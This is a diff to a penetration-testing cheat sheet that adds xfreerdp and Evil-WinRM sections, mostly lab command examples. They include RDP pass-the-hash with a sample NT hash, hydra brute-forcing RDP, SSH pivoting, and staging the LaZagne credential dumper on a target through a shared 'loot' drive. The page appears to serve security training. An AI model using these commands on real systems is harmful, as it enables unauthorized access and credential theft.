@@ -5,13 +5,115 @@ description: "Choose a Windows remote-access method, identify its ports, and che
 keywords: ["rdp", "winrm", "wmi", "xfreerdp", "evil-winrm", "wmiexec", "3389", "5985"]
 ---
 
-{/* VAULT_QUICK_NAV_START */}
+## xfreerdp: choose the operation and read the result
 
-**Jump to a section**
+Connect to an RDP desktop; optional drive sharing moves files.
 
-[Tools for this service](#tools-for-this-service) · [Overview](#overview) · [RDP (Remote Desktop Protocol)](#rdp-remote-desktop-protocol) · [WinRM (Windows Remote Management)](#winrm-windows-remote-management) · [WMI (Windows Management Instrumentation)](#wmi-windows-management-instrumentation) · [Validating creds & spraying across hosts (NetExec)](#validating-creds-&-spraying-across-hosts-netexec) · [Quick Reference — Ports](#quick-reference-—-ports) · [Enumeration Workflow](#enumeration-workflow) · [Key Takeaways](#key-takeaways)
+### What the result establishes
 
-{/* VAULT_QUICK_NAV_END */}
+A displayed desktop proves an RDP logon for that identity; inspect the remote session and privileges afterward.
+
+### Prerequisites and common failures
+
+Match the installed FreeRDP syntax and authentication mechanism; RDP logon rights, NLA, TLS trust and account restrictions are independent checks.
+
+### Example 1: Commands
+
+Run in: **Kali**. Some Kali installs name the client xfreerdp3. Use the installed launcher; verify the server certificate.
+
+```bash
+xfreerdp /v:TARGET_IP /d:DOMAIN /u:USER /p:'PASSWORD'
+# Share a local folder with the RDP session
+xfreerdp /v:TARGET_IP /d:DOMAIN /u:USER /p:'PASSWORD' /drive:kali,/home/kali/transfer
+```
+
+### Example 2: RDP File Transfers
+
+Run in: **Saved lab example**.
+
+```bash
+xfreerdp /v:<IP> /d:<DOMAIN> /u:<USER> /p:'<PASS>' /drive:linux,/home/user/transfer
+```
+
+Saved context: [File Transfers for Linux and Windows — RDP File Transfers](/post-exploitation/file-transfers-cheat-sheet#rdp-file-transfers). The block is retained as recorded; replace lab-specific values and omit transcript prompts/output when entering commands.
+
+### Example 3: RDP File Transfers
+
+Run in: **Saved lab example**.
+
+```bash
+rdesktop <IP> -d <DOMAIN> -u <USER> -p '<PASS>' -r disk:linux='/home/user/transfer'
+```
+
+Saved context: [File Transfers for Linux and Windows — RDP File Transfers](/post-exploitation/file-transfers-cheat-sheet#rdp-file-transfers). The block is retained as recorded; replace lab-specific values and omit transcript prompts/output when entering commands.
+
+### Example 4: RDP — PtH for GUI access (xfreerdp)
+
+Run in: **Saved lab example**.
+
+```bash
+xfreerdp /v:10.129.201.126 /u:julio /pth:64F12CDDAA88057E06A81B54E73B949B
+```
+
+Saved context: [Pass the Hash from Linux and Windows — RDP — PtH for GUI access (xfreerdp)](/password-attacks/pass-the-hash#rdp-—-pth-for-gui-access-xfreerdp). The block is retained as recorded; replace lab-specific values and omit transcript prompts/output when entering commands.
+
+### Example 5: RDP (3389)
+
+Run in: **Saved lab example**.
+
+```bash
+hydra -L user.list -P password.list rdp://10.129.42.197
+xfreerdp /v:10.129.42.197 /u:user /p:password     # connect with GUI
+```
+
+Saved context: [Password Attacks: Cracking, Files, and Credential Stores — RDP (3389)](/password-attacks/password-attacks-cheat-sheet#rdp-3389). The block is retained as recorded; replace lab-specific values and omit transcript prompts/output when entering commands.
+
+### Example 6: Option B — ligolo‑ng (transparent TUN — best for RDP/GUI tools)
+
+Run in: **Saved lab example**.
+
+```bash
+ssh -L 13389:172.16.119.7:3389 jbetty@&lt;DMZ_IP>     # then RDP to 127.0.0.1:13389 (no proxychains)
+xfreerdp3 /v:127.0.0.1:13389 /u:bdavid /p:'...' /cert:ignore
+```
+
+Saved context: [Active Directory Attack Path: Worked Lab — Option B — ligolo‑ng (transparent TUN — best for RDP/GUI tools)](/cheatsheets/ad-attack-path-worked-example#option-b-—-ligolo‑ng-transparent-tun-—-best-for-rdp/gui-tools). The block is retained as recorded; replace lab-specific values and omit transcript prompts/output when entering commands.
+
+### Example 7: 11. File transfer over a pivot
+
+Run in: **Saved lab example**.
+
+```bash
+xfreerdp3 /v:127.0.0.1:13389 /u:bdavid /p:'...' /cert:ignore /drive:kali,/home/kali/loot
+#   inside Windows:  copy \\tsclient\kali\Windows\LaZagne.exe C:\Users\Public\
+```
+
+Saved context: [Active Directory Attack Path: Worked Lab — 11. File transfer over a pivot](/cheatsheets/ad-attack-path-worked-example#11-file-transfer-over-a-pivot). The block is retained as recorded; replace lab-specific values and omit transcript prompts/output when entering commands.
+
+## Evil-WinRM: choose the operation and read the result
+
+Open a Windows PowerShell session over WinRM; the account needs endpoint access.
+
+### What the result establishes
+
+A successful session identifies a WinRM-authorized account; use whoami and privilege checks to establish its actual token.
+
+### Prerequisites and common failures
+
+WinRM reachability and authorization differ from SMB. The current remote token may not carry credentials for a second network hop.
+
+### Example 1: Commands
+
+Run in: **Kali**.
+
+```bash
+evil-winrm -i TARGET_IP -u USER -p 'PASSWORD'
+evil-winrm -i TARGET_IP -u USER -H NT_HASH
+# HTTPS
+evil-winrm -S -i TARGET_IP -u USER -p 'PASSWORD'
+```
+
+## Existing notes and worked examples
 
 {/* SERVICE_TOOLS_START */}
 
